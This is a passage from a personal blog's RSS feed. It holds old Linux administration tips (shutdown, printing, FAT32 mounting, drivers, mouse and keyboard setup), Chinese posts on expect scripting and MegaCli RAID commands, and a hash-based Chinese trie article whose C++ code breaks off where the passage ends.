><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Here are the steps that need to be done when you want to shutdown:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The operating system needs to stop all the running processes and logout the users.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Various servers need to be shutdown in a proper way.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >All the mounted file systems need to be unmounted safely and unwritten data need to be stored</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >on the disk.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The system can then be turned off safely.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >To accomplish all these tasks, the shutdown command exists. That command has a lot of options, and you</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >should explore them before trying anything at random. Another way to shutdown a Linux system is to set the</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >runlevel to 0, the default shutdown level, with the init program.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.14</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 14: LPD started but no device found</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The printer daemon is called LPD. It will be started at boot time and assume that a printer is connected to the</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >printer port. But a problem may occur when the daemon is started and no device is found.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The most common cause for this problem is a configuration problem in the kernel. Make sure that parallel</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >port, PC-style parallel port, and printer support is enabled in the configuration, and that modules are loaded.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.15</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 15: Read files from FAT32 drives</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The Linux utility mount can read any file system that the kernel supports. Since version 2.0.34, the kernel</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >supports FAT32, which is the main file system used by Windows 98.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >To read the FAT32 file system you need to specify the -tvfat option to mount. Here is an example:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >mount -tvfat /dev/hdb1 /mnt</SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.16</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 16: TV on Linux</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >A number of cards exist allowing you to watch and record TV on your PC. Most come with software for</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Windows only, like so many things, but it is possible to do the same thing on Linux.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Linux comes with several drivers which make up the Video4Linux drivers. Several cards are supported by</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >these drivers, and a list of them is available at </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >http://roadrunner.swansea.linux.org.uk/v4l.shtml</SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >. This is the</SPAN></FONT></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >driver side. You also need software to use the devices.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Several programs are available to watch TV, capture images and even Web applications. A list of some of the</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >programs is available at </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >http://www.thp.uni-koeln.de/~rjkm/linux/bttv.html </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >including datasheets.</SPAN></FONT></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.17</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 17: Device drivers</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Hardware devices are not of much use without device drivers. Fortunately, the Linux kernel, like every other</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >operating system, comes with a lot of them.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >When you configure a kernel, the menu from which you must choose which devices you have in your</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >computer is actually a list of device drivers available to you. Here is how to configure your kernel:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; COLOR: black; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >cd /usr/src/linux</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; COLOR: black; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >make menuconfig</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Linux, still not being as popular as some other operating systems, can't support all of the existing hardware.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >If you have a device that is not in the list, then you will need to search for it on the Web. Some drivers may</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >exist for Linux and not be in the default kernel. But if a device is not currently supported by any driver for</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Linux, then you will have to wait for someone to make one, or make one yourself.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >If you want to write your own driver, the best place to start is at The Kernel Hacker's Guide, available at</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  ><A rel="nofollow" href="http://khg.redhat.com/HyperNews/get/khg.html"  ><FONT face="Times New Roman"  >http://khg.redhat.com/HyperNews/get/khg.html</FONT></A></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.18</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 18: Mouse problems</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The mouse is a very important part of a computer. In X, you can't do much without it. Even in console some</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >applications will allow you to use it. You must first configure it.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Like every other device, the mouse has a device file in the /dev directory. Depending on your mouse type, it</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >will be either /dev/psaux for a PS/2 mouse, or /dev/cua0 for a serial mouse on COM1.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >To make it easy to use in the future, you should link the right device file to /dev/mouse:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >ln -s /dev/cua0 /dev/mouse</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Then, when you configure X Window or any other program that requires a mouse, you can specify</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >/dev/mouse.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.19</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 19: International keyboards</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The X Window System comes by default with an english keymap on most distributions. If you have a</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >keyboard from another country, it may be a problem.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The XKB extension was provided for that purpose. If you look in your X configuration file, usualy in</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >/etc/X11 called XF86Config, you will find a section about the keyboard. There, you may specify several</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >parameters, including the keymap and keycodes to use.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >For a list of available keymaps, you can look in your X directory. Most of those keymaps are also available</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >from the graphical configuration program, XF86Setup.</FONT></SPAN></P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200832521347945/</guid>
    </item>
    <item>
      <title>
<![CDATA[expect用法小结]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201131985258158/</link>
      <description>
<![CDATA[expect是一个很好很强大的工具, 将很多需要交互的工作自动化,一些Tips记录如下:<br>1. 简单有脚本<br>#!/usr/bin/expect -f<br>spawn ssh hankjin@ubuntu.unix-center.net<br>expect "*password*" {send "mysecret\r"}<br>interact<br>2. 分支执行: 如果提示bash,就进入交互环境, 如果提示password, 就输入密码后继续执行<br>expect {<br>"*bash*" {interact}<br>"*password*" {send "mysecret\r"}<br>}<br><br>3. for循环: for i=1;i&lt;20;i++<br>for {set i 1} {$i&lt;20} {incr i} {<br>send_user "hi$i\n"<br>}<br>4.foreach循环: foreach ip in lists:<br>foreach ip {<br>127.0.0.1<br>127.0.0.1<br>} {<br>send_user "$ip\n"<br>}<br>5. 循环判断: for(;1;){ break;}<br>for {}{1}{}{<br>expect {<br>&nbsp;"*yes/no*" {send "yes\r"}<br>&nbsp;"*password*" {send "mysecret\r"}<br>&nbsp;"*bash*" break<br>}<br>}<br>6. 命令行参数: argc, argv[0]<br>if {$argc &gt; 0} {<br>&nbsp;send_user [lindex $argv 0]<br>&nbsp;exit<br>}<br>7. 释放资源, 否则大循环在最后资源不足: exp_wait exp_close.<br>foreach ip {<br>...<br>} {<br>spawn scp xxx yyy<br>set my_id $spawn_id<br>...<br>exp_wait -i $my_id<br>exp_close -i $my_id<br>}]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201131985258158/</guid>
    </item>
    <item>
      <title>
<![CDATA[MegaCli操作RAID卡]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372011519112511457/</link>
      <description>
<![CDATA[软RAID通过 cat /proc/mdstat 查看RAID状态,&nbsp; lspci | grep raid;&nbsp; cat /proc/scsi/scsi<br>硬RAID则需要使用相应工具, 如raidutil, megarc, raidmon(dell only), MegaCli<br><br><wbr><b>查看信息:<br></b>查看逻辑磁盘信息:<br>MegaCli -PDInfo -aall<br>MegaCli -LDInfo -Lall -aall<br><br><b>修改属性:</b><br>打开磁盘缓存<br>MegaCli -LDSetProp -EnDskCache -Lall -aall<br>MegaCli -LDSetProp -DisDskCache -Lall -aall<br><br><b>参考:</b><br>http://hi.baidu.com/jackbillow/blog/item/9b8fc5d4d719320da08bb76b.html<br>http://tools.rapidsoft.de/perc/perc-cheat-sheet.pdf<br>http://www.nuclex.org/blog/personal/80-aligning-an-ssd-on-linux]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>默认分类</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372011519112511457/</guid>
    </item>
    <item>
      <title>
<![CDATA[字典树(Trie)-&gt;中文字典树(哈希字典树)]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201092795135106/</link>
      <description>
<![CDATA[字典树，又名Trie树，是字符串操作中一个常见的数据结构，例如用来查单词。其实字典树可以看做一个26或52节点的B树，这是因为英文字符只有26个大写和26个小写字母。<br>但是在存储中文时，问题就出来了：常用的汉字大概有5万个，因此，如果中文字典树也用Trie的方式存储，就会出现每个节点占用空间太大的问题。<br>这样在处理中文字符时，就不得不对传统的字典树进行改进。拼音表示和哈希表示<br><b>拼音表示：<br></b>将中文用拼音表示，然后就可以用传统Trie的方式保存和处理了。这种方式比较简单，但存在多音字的问题，所以只能解决有限的问题。<br><br><b>哈希表示：</b><br>每个节点的子节点用一个哈希表存储，这样就不用浪费太大的空间，而且查询速度上可以保留哈希的复杂度O(1)<br>例如：<br>“我”的下一个可能为“们，是，爱，说”<br>就可以为我建立一个大小为7的哈希表，作为子节点，将这四个字存入哈希表中。<br>这样就解决了汉字字典树的浪费空间的问题，保持了字典树的复杂度。<br><div><div><div><img title="字典树(Trie)-中文字典树(哈希字典树) - hankjin - 云水居" alt="字典树(Trie)-中文字典树(哈希字典树) - hankjin - 云水居" style="margin: 0pt 10px 0pt 0pt;" src="http://img471.ph.126.net/8KRq936868ikQCecB8Knsg==/2543689364534733638.png"></div>&nbsp;</div>&nbsp;</div>如上图所示的一个哈希字典树，包括单词“我是谁”，“我是人”，“我们”，“我爱”，“我说”<br>每个节点包含一个指针sons(指向哈希表)，一个整数used(表示子节点的个数)，一个素数size(表示哈希表的大小，值为大于2*used的素数)。如上图所示“我”有四个子节点，所以used=4, size=11, sons指向一个大小为11的哈希表，哈希表中存储着子节点的指针或NULL。<br><b>复杂度分析：</b><br>如果不用字典树，则要用索引的方式存储与读取，而定位每一级元素的时间，理论上需要n/2的复杂度，如果用二分搜索的方式，复杂度可以降到log2N，但这种哈希字典树使用哈希，复杂度为常数级(哈希冲突)，效果明显比索引要好。<br><b>代码：<br></b>这段代码思想是这样的，但是没有使用中文。<br>/*<br>&nbsp;* @desc: index and tree<br>&nbsp;* @date: 2010-11-3<br>&nbsp;* @author: hankjin<br>&nbsp;*/<br>#include &lt;iostream&gt;<br>#include &lt;fstream&gt;<br>#include &lt;cmath&gt;<br>#include &lt;cstring&gt;<br>#include &lt;ctime&gt;<br>using namespace std;<br>#define MAXN 40<br><br>typedef struct _node{<br>&nbsp;&nbsp;&nbsp; struct _node *first;&nbsp;&nbsp;&nbsp; //first element of index<br>&nbsp;&nbsp;&nbsp; struct _node *next;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //next element of index<br>&nbsp;&nbsp;&nbsp; struct _node **sons;&nbsp;&nbsp;&nbsp; //hash array<br>&nbsp;&nbsp;&nbsp; int size;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //hash array size<br>&nbsp;&nbsp;&nbsp; int used;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //son number<br>&nbsp;&nbsp;&nbsp; char value;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //value<br>&nbsp;&nbsp;&nbsp; bool isword;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //is end of word or middle <br>&nbsp;&nbsp;&nbsp; _node(char v){<br>&nbsp;&nbsp;&nbsp; sons=NULL;<br>&nbsp;&nbsp;&nbsp; first=next=NULL;<br>&nbsp;&nbsp;&nbsp; used=0;<br>&nbsp;&nbsp;&nbsp; value=v;<br>&nbsp;&nbsp;&nbsp; isword=false;<br>&nbsp;&nbsp;&nbsp; }<br>}node;<br>//add a element to index<br>void indexadd(node *root, char *word);<br>//convert index to tree<br>void index2tree(node *root);<br>//find by index<br>bool indexfind(node *root, char *word);<br>//find by tree<br>bool treefind(node *root, char *word);<br>//tree hash<br>inline int treehash(node *p, char value){<br>&nbsp;&nbsp;&nbsp; return (int)value % p-&gt;size;<br>}<br>//calc hash array size, accord to son number.<br>//rule: least prime number which is larger then 2 times son number<br>//eg: if a node has 5 son, 11 is the least prime larger then 2*5<br>inline int hashfactor(int x){<br>&nbsp;&nbsp;&nbsp; if(x&lt;3)//at least 3<br>&nbsp;&nbsp;&nbsp; return 3;<br>&nbsp;&nbsp;&nbsp; for(int i, res=x/2*4+1; ; res+=2){<br>&nbsp;&nbsp;&nbsp; for(i=3; i&lt;=sqrt(res); i+=2){//is prime<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(res%i==0)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; if(res%i!=0)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return res;<br>&nbsp;&nbsp;&nbsp; }<br>}<br><br>ifstream fin("/usr/share/dict/words");<br>ifstream fin1("/usr/share/dict/words");<br>ifstream fin2("/usr/share/dict/words");<br>int main(){<br>&nbsp;&nbsp;&nbsp; node root(' ');<br>&nbsp;&nbsp;&nbsp; char tmp[MAXN];<br>&nbsp;&nbsp;&nbsp; //build index<br>&nbsp;&nbsp;&nbsp; while(fin&gt;&gt;tmp){<br>&nbsp;&nbsp;&nbsp; indexadd(&amp;root, tmp);<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; //convert from index to tree, with index keeped<br>&nbsp;&nbsp;&nbsp; index2tree(&amp;root);<br>&nbsp;&nbsp;&nbsp; //cin&gt;&gt;tmp;<br>&nbsp;&nbsp;&nbsp; char word[] = "hello";<br>&nbsp;&nbsp;&nbsp; int M = 100;<br>&nbsp;&nbsp;&nbsp; int N = 10000000;<br>&nbsp;&nbsp;&nbsp; clock_t t1 = clock();<br>&nbsp;&nbsp;&nbsp; while(fin1&gt;&gt;tmp){<br>&nbsp;&nbsp;&nbsp; for(int i=0;i&lt;M;i++)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; indexfind(&amp;root, tmp);<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; clock_t t2 = clock();<br>&nbsp;&nbsp;&nbsp; while(fin2&gt;&gt;tmp){<br>&nbsp;&nbsp;&nbsp; 